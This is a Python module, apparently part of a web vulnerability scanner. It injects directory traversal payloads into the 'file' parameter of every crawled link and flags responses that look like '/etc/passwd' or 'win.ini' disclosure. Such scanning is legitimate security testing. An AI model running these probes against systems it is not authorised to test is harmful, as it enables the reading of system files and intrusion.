import requests
from urllib.parse import urlparse, urljoin
from payloads.payloads import directory_traversal_payloads
from core.utils import extract_links
import logging

logger = logging.getLogger(__name__)

def test_directory_traversal(url):
    found_vulns = []

    try:
        response = requests.get(url, timeout=5)
        links = extract_links(response.text, url)
    except Exception as e:
        logger.warning(f"[!] Failed to extract links from {url} — {e}")
        return []

    for link in links:
        for payload in directory_traversal_payloads:
            parsed = urlparse(link)
            base = f"{parsed.scheme}://{parsed.netloc}"
            vuln_url = urljoin(base, f"{parsed.path}?file={payload}")
            
            try:
                response = requests.get(vuln_url, timeout=5)
                if "root:x" in response.text or "[extensions]" in response.text:
                    found_vulns.append({
                        "url": vuln_url,
                        "payload": payload,
                        "indicator": "Possible file disclosure (e.g. /etc/passwd or win.ini)"
                    })
                    logger.info(f"[!!!] Directory Traversal Found: {vuln_url}")
            except requests.exceptions.RequestException as e:
                logger.debug(f"[!] Request failed for {vuln_url}: {e}")
                continue

    return found_vulns
